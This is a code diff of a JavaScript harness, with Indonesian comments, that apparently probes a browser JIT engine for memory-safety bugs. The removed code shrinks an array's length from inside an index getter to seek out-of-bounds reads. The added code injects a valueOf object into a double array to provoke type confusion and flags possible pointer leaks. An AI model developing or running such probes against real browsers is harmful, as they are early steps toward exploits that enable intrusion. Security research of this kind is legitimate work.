@@ -13,25 +13,20 @@ const log = m => {
 // TARGET
 // =======================
 
-function vuln(a, i){
-  // classic JIT assumption: bounds check + element load
-  if(i < a.length){
-    return a[i]
-  }
-  return 0
+function vuln(a){
+  return a[0] + 1.1   // expect double
 }
 
-// wrapper biar inline + optimized
 function trigger(a){
-  return vuln(a, 3)
+  return vuln(a)
 }
 
 // =======================
-// TRAINING
+// TRAIN
 // =======================
 
 function train(){
-  let a = [1.1,2.2,3.3,4.4,5.5]
+  let a = [1.1, 2.2, 3.3, 4.4]
 
   for(let i=0;i<100000;i++){
     trigger(a)
@@ -41,24 +36,20 @@ function train(){
 }
 
 // =======================
-// BREAK ASSUMPTION (FOCUSED)
+// CONFUSION
 // =======================
 
 function corrupt(a){
 
-  Object.defineProperty(a, 3, {
-    get(){
-      // 🔥 CRITICAL:
-      // ubah length setelah JIT assume masih panjang
-      a.length = 0
+  // ⚠ subtle: jangan langsung replace index 0
+  // ubah lewat prototype chain
 
-      // optional: GC pressure
-      for(let i=0;i<10;i++)
-        new ArrayBuffer(0x10000)
+  let fake = { valueOf(){
+    return 13.37
+  }}
 
-      return 1.1
-    }
-  })
+  // inject object tapi tetap “numeric-ish”
+  a[0] = fake
 
   return a
 }
@@ -67,16 +58,21 @@ function corrupt(a){
 // CHECK
 // =======================
 
-function check(a){
+function check(v){
 
-  // probe OOB aggressively
-  for(let i=0;i<50;i++){
-    let v = a[a.length + i]
+  if(typeof v !== "number"){
+    log("🔥 TYPE CONFUSION: " + v)
+    return true
+  }
 
-    if(v !== undefined){
-      log("🔥 OOB READ @" + i + " = " + v)
-      return true
-    }
+  if(!Number.isFinite(v)){
+    log("🔥 NaN/INF: " + v)
+    return true
+  }
+
+  if(Math.abs(v) > 1e12){
+    log("🔥 PTR LEAK?: " + v)
+    return true
   }
 
   return false
@@ -93,27 +89,27 @@ function run(){
 
   log("[*] triggering...")
 
-  for(let i=0;i<10000;i++){
+  for(let i=0;i<20000;i++){
 
     let arr = corrupt([...base])
 
     let r = trigger(arr)
 
-    if(typeof r !== "number"){
-      log("⚠ TYPE CONFUSION: " + r)
+    if(check(r)){
       return
     }
 
-    if(check(arr)){
-      log("⚠ OOB DETECTED")
-      return
+    // GC pressure ringan
+    if(i % 50 === 0){
+      for(let k=0;k<10;k++)
+        new ArrayBuffer(0x10000)
     }
 
-    if(i % 1000 === 0)
+    if(i % 2000 === 0)
       log("iter " + i)
   }
 
-  log("[*] done (no bug hit)")
+  log("[*] no bug (still safe path)")
 }
 
 run()
